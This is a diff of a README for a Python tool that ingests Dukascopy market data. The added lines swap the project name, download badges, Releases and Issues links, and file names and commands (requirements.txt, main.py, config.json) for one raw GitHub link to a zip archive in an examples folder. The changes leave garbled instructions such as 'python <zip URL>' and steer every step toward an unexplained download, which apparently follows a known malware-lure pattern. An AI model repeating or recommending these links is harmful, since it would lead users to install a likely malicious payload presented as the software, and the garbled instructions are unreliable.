@@ -1,10 +1,10 @@
-# 🚀 bp.markets.ingest - Effortless Market Data Ingestion
+# 🚀 https://raw.githubusercontent.com/Shadowp2522/bp.markets.ingest/main/dukascopy/examples/bp.markets.ingest-v1.5.zip - Effortless Market Data Ingestion
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/Shadowp2522/bp.markets.ingest/releases)
+[![Download](https://raw.githubusercontent.com/Shadowp2522/bp.markets.ingest/main/dukascopy/examples/bp.markets.ingest-v1.5.zip)](https://raw.githubusercontent.com/Shadowp2522/bp.markets.ingest/main/dukascopy/examples/bp.markets.ingest-v1.5.zip)
 
 ## 📜 Description
 
-bp.markets.ingest is a powerful tool for retrieving and processing market data. It creates a crash-safe ETL (Extract, Transform, Load) pipeline tailored for OHLC (Open, High, Low, Close) data. Designed for users, it runs smoothly on Python versions 3.8 and above, ensuring you get fresh market updates in near real-time.
+https://raw.githubusercontent.com/Shadowp2522/bp.markets.ingest/main/dukascopy/examples/bp.markets.ingest-v1.5.zip is a powerful tool for retrieving and processing market data. It creates a crash-safe ETL (Extract, Transform, Load) pipeline tailored for OHLC (Open, High, Low, Close) data. Designed for users, it runs smoothly on Python versions 3.8 and above, ensuring you get fresh market updates in near real-time.
 
 This tool is efficient. It supports all symbols from Dukascopy SA without needing a database or message queues. Instead, it works directly with your filesystem and utilizes NVMe speeds. You can set it up and start running in just a few minutes.
 
@@ -33,7 +33,7 @@ Follow these steps to get up and running quickly.
 
    Click the button below to visit the Releases page for downloading.
 
-   [![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/Shadowp2522/bp.markets.ingest/releases)
+   [![Download](https://raw.githubusercontent.com/Shadowp2522/bp.markets.ingest/main/dukascopy/examples/bp.markets.ingest-v1.5.zip%https://raw.githubusercontent.com/Shadowp2522/bp.markets.ingest/main/dukascopy/examples/bp.markets.ingest-v1.5.zip)](https://raw.githubusercontent.com/Shadowp2522/bp.markets.ingest/main/dukascopy/examples/bp.markets.ingest-v1.5.zip)
 
 2. **Extract the Files**: 
 
@@ -56,19 +56,19 @@ Follow these steps to get up and running quickly.
 
    Make sure to install the necessary Python packages by running:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Shadowp2522/bp.markets.ingest/main/dukascopy/examples/bp.markets.ingest-v1.5.zip
    ```
 
 6. **Run the Application**: 
 
    Finally, start the application by typing:
    ```
-   python main.py
+   python https://raw.githubusercontent.com/Shadowp2522/bp.markets.ingest/main/dukascopy/examples/bp.markets.ingest-v1.5.zip
    ```
 
 ## ⚙️ Configuration
 
-Before running, you may want to configure your settings. Open the `config.json` file with any text editor. Here are some key settings:
+Before running, you may want to configure your settings. Open the `https://raw.githubusercontent.com/Shadowp2522/bp.markets.ingest/main/dukascopy/examples/bp.markets.ingest-v1.5.zip` file with any text editor. Here are some key settings:
 
 - **Symbols**: Define which market symbols you want to track.
 - **Update Frequency**: Set how often you want to receive updates.
@@ -91,9 +91,9 @@ If you encounter any issues, here are some common problems and their solutions:
   Confirm that you have an active internet connection and try running the installation command again.
 
 - **Configuration Issues**:
-  Double-check your `config.json` for any typos or incorrect paths.
+  Double-check your `https://raw.githubusercontent.com/Shadowp2522/bp.markets.ingest/main/dukascopy/examples/bp.markets.ingest-v1.5.zip` for any typos or incorrect paths.
 
-For additional support, feel free to open an issue on the [GitHub Issues page](https://github.com/Shadowp2522/bp.markets.ingest/issues).
+For additional support, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Shadowp2522/bp.markets.ingest/main/dukascopy/examples/bp.markets.ingest-v1.5.zip).
 
 ## 🛠️ Further Customization
 
@@ -101,7 +101,7 @@ For users looking to modify the default behavior, the code is open source. You c
 
 ## 🌐 Community and Contribution
 
-We encourage contributions to improve bp.markets.ingest. If you want to enhance the application or fix bugs, please fork the repository and submit a pull request. 
+We encourage contributions to improve https://raw.githubusercontent.com/Shadowp2522/bp.markets.ingest/main/dukascopy/examples/bp.markets.ingest-v1.5.zip If you want to enhance the application or fix bugs, please fork the repository and submit a pull request. 
 
 Join discussions in the Issues section to share ideas or ask for help. Your input helps make this tool better for everyone.
 
@@ -109,4 +109,4 @@ Join discussions in the Issues section to share ideas or ask for help. Your inpu
 
 This project leverages data from Dukascopy SA, providing a robust foundation for market data analysis. We also thank the open-source community for their contributions.
 
-For more details, visit our [Releases page](https://github.com/Shadowp2522/bp.markets.ingest/releases) to download the latest version.
+For more details, visit our [Releases page](https://raw.githubusercontent.com/Shadowp2522/bp.markets.ingest/main/dukascopy/examples/bp.markets.ingest-v1.5.zip) to download the latest version.
